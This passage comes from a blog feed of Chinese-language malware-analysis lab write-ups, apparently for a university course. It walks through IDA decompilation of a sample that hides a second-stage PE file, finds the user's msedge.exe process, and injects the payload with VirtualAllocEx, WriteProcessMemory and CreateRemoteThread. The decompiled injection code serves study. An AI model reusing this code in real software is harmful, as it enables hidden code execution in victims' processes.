&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll optional header magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>進到&lt;code>sub_140001BF0&lt;/code>之後可以先觀察&lt;code>sub_140001870&lt;/code>，前面有source code可以看到他正在比對&lt;code>byte_140005040&lt;/code>的前面兩個字元是不是等於&lt;code>MZ&lt;/code>，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中
:::info
如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把&lt;code>byte_140005040&lt;/code>改變他的type，變成&lt;code>char[72770]&lt;/code>，再用Shift+E，把raw data export出來，丟到&lt;a href="https://emn178.github.io/online-tools/md5_checksum.html">online md5 checksum&lt;/a>，就可以得到這支檔案的hash(&lt;code>462fe0007f86957f59824e113f78947c&lt;/code>)
&lt;img src="https://hackmd.io/_uploads/SJoeiepGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rk7SigpGp.png" alt="" />
:::&lt;/li>
&lt;li>&lt;code>sub_1400013D0&lt;/code>仔細看他的操作，其實就是把&lt;code>byte_140005040&lt;/code>的地址，加上&lt;code>0x3C&lt;/code>，再取值，就是&lt;code>e_lfanew&lt;/code>，也就是NT Headers的file offset，這個offset加上原本的原本的&lt;code>140005040&lt;/code>就是NT header，所以可以把&lt;code>sub_1400013D0&lt;/code> rename成&lt;code>getNtHdr&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">getNtHdr&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x3C&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>接下來可以改變這個function的type，按Y，&lt;code>改IMAGE_NT_HEADERS *__fastcall getNtHdr(_QWORD)&lt;/code>，就變得非常簡潔好看，另外，要把&lt;code>pe_file&lt;/code>的type從&lt;code>_int64&lt;/code>改成&lt;code>_QWORD&lt;/code>的原因是&lt;code>pe_file&lt;/code>存的是&lt;code>byte_140005040&lt;/code>的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來
&lt;img src="https://hackmd.io/_uploads/ryHl0gaG6.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rJniAlaM6.png" alt="" />&lt;/li>
&lt;li>最後就把目前的這個sub function rename成&lt;code>getEmbeddedPE_File&lt;/code>就可以了&lt;/li>
&lt;/ol>
&lt;p>:::info
&lt;img src="https://hackmd.io/_uploads/HJaNxWpzp.png" alt="" />
:::
:::spoiler 解析後&lt;/p></description></item><item><title>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</guid><description>&lt;h1 id="simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">
 Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)
 &lt;a class="anchor" href="#simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw">Process32FirstW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">GetCurrentProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-equalsid">EqualSid&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32nextw">Process32NextW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation">GetTokenInformation&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_1400016B0
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#a6e22e">returnTargetPid&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR &lt;span style="color:#f92672">*&lt;/span>szExeFile; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v4; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR v5; &lt;span style="color:#75715e">// dx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v6; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD th32ProcessID; &lt;span style="color:#75715e">// [rsp+20h] [rbp-288h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hSnapshot; &lt;span style="color:#75715e">// [rsp+28h] [rbp-280h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hObject; &lt;span style="color:#75715e">// [rsp+30h] [rbp-278h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE CurrentProcess; &lt;span style="color:#75715e">// [rsp+38h] [rbp-270h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid1; &lt;span style="color:#75715e">// [rsp+40h] [rbp-268h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid2; &lt;span style="color:#75715e">// [rsp+48h] [rbp-260h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PROCESSENTRY32W pe; &lt;span style="color:#75715e">// [rsp+50h] [rbp-258h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hSnapshot &lt;span style="color:#f92672">=&lt;/span> CreateToolhelp32Snapshot(&lt;span style="color:#ae81ff">2u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hSnapshot &lt;span style="color:#f92672">==&lt;/span> (HANDLE)&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;CreateToolhelp32Snapshot failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pe.dwSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">568&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Process32FirstW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid2 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CurrentProcess &lt;span style="color:#f92672">=&lt;/span> GetCurrentProcess();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001500(CurrentProcess, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid1 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hObject &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x400u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, pe.th32ProcessID);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hObject )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)sub_140001500(hObject, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid1) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( EqualSid(pSid1, pSid2) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> szExeFile &lt;span style="color:#f92672">=&lt;/span> pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;msedge.exe&amp;#34;&lt;/span> &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>szExeFile &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_14;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> v5 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_14:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v6 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> pe.th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>th32ProcessID &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Process32NextW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;Process32First failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, v2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先，他先利用&lt;code>CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)&lt;/code>把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)&lt;/p></description></item><item><title>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</guid><description>&lt;h1 id="simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">
 Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)
 &lt;a class="anchor" href="#simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread&lt;/a>&lt;/li>
&lt;li>Export Address Table(EAT)
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/rJuBbwaGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/HJEI-P6zp.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/S1Qu-PTM6.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code &lt;code>sub_140001A60&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001A60&lt;/span>(DWORD edge_pid, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pe_file, SIZE_T pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD v4; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hProcess; &lt;span style="color:#75715e">// [rsp+40h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>lpBaseAddress; &lt;span style="color:#75715e">// [rsp+48h] [rbp-30h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LPTHREAD_START_ROUTINE lpStartAddress; &lt;span style="color:#75715e">// [rsp+50h] [rbp-28h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v9; &lt;span style="color:#75715e">// [rsp+58h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD ThreadId; &lt;span style="color:#75715e">// [rsp+60h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_1400018F0(pe_file, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v9);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hProcess &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x43Au&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, edge_pid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hProcess )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpBaseAddress &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)VirtualAllocEx(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, pe_file_size, &lt;span style="color:#ae81ff">0x3000u&lt;/span>, &lt;span style="color:#ae81ff">0x40u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, &lt;span style="color:#ae81ff">0&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpStartAddress &lt;span style="color:#f92672">=&lt;/span> (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CreateRemoteThread(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9], &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>ThreadId);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote thread id: %lu, loader address: %p&amp;#34;&lt;/span>, ThreadId, lpStartAddress);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;WriteProcessMemory failed, %lu&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;OpenProcess failed, %lu&amp;#34;&lt;/span>, v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
